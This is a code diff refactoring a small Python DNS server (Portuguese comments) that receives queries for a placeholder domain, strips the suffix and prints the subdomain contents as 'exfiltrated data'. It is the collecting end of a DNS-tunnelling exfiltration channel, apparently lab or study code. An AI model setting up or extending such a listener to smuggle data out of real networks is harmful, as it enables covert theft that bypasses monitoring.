@@ -1,21 +1,28 @@
+###############################################################
+# Imports
+###############################################################
 import socket
 from dnslib import DNSRecord, QTYPE, RR, A
-
 import time
 
-def decode_data_from_domain(domain):
-    # Remove o sufixo do domínio
-    domain = domain.replace('.example.com.', '')
-    
-    # Junta as partes do domínio para reconstruir os dados originais
-    decoded_data = ''.join(domain.split('.'))
-    return decoded_data
+###############################################################
+# Vars. Global
+###############################################################
+_DNS_ADDR = ('0.0.0.0', 9953)
+_FAKE_DOMAIN = '.example.com.'
+
+
+###############################################################
+# Classes e Funções
+###############################################################
+def decode_request(request):
+    data = request.replace(_FAKE_DOMAIN, '')
+    return data
 
 def start_dns_server():
     # Cria um socket para ouvir requisições DNS
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('0.0.0.0', 9953))
-    
+    sock.bind(_DNS_ADDR)
     print("Servidor DNS ouvindo na porta 9953...")
     
     while True:
@@ -24,12 +31,13 @@ def start_dns_server():
             
             # Lê a requisição DNS
             request = DNSRecord.parse(data)
+            print(f'DNS PARSE: {request}')
             domain = str(request.q.qname)
-            
-            print(f"Requisição DNS recebida para o domínio: {domain}")
+            print(f'REQUEST.Q>NAME: {domain}')
             
             # Decodifica os dados do domínio
-            decoded_data = decode_data_from_domain(domain)
+            decoded_data = decode_request(domain)
+            decoded_data = decoded_data.replace('\\032', ' ')
             print(f"Dados exfiltrados: {decoded_data}")
             
             
@@ -50,6 +58,8 @@ def start_dns_server():
             print(e)
 
 
-
+###############################################################
+# Main
+###############################################################
 if __name__ == "__main__":
     start_dns_server()
